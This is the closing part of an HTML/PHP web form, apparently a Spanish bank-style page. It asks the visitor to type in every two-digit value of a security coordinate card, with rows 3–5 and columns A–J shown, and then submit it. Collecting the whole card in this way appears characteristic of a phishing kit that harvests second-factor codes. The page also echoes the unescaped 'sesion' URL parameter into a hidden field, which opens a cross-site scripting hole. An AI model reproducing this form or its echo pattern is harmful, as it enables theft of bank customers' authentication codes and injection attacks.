					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="I3" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="J3" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
				</tr>
				<tr>
					<td align="center" bgcolor="#7E7A95" height="35" width="60">
					<b><font face="Arial Black" size="2" color="#FFFFFF">4</font></b></td>
					<td align="center" bgcolor="#7A7691" height="35" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="A4" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="B4" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="C4" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="D4" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="E4" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="F4" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="G4" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="H4" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="I4" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="J4" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
				</tr>
				<tr>
					<td align="center" bgcolor="#7E7A95" height="35" width="60">
					<b><font face="Arial Black" size="2" color="#FFFFFF">5</font></b></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="A5" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="B5" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="C5" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="D5" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="E5" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="F5" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="G5" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="H5" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="I5" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="J5" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<input type="hidden" name="id" value="<?php echo $_GET["sesion"];?>" />
				</tr>
				</table>
					</div>
			</td>
	</tr>
	<tr>
		<td background="imagenes/coordenada2_03.jpg" width="700" height="36" alt=""><a href="javascript:Validar()" class="link"><div align="center">
				<img src="imagenes/bot_enviar.gif" border=0></div></a></td>
	</tr>
</table>
<p>
<img border="0" src="imagenes/banner_novedades.gif" width="705" height="112"><br>
&nbsp;</p>
</form>
</div>
<!-- End ImageReady Slices -->
</body>
</html>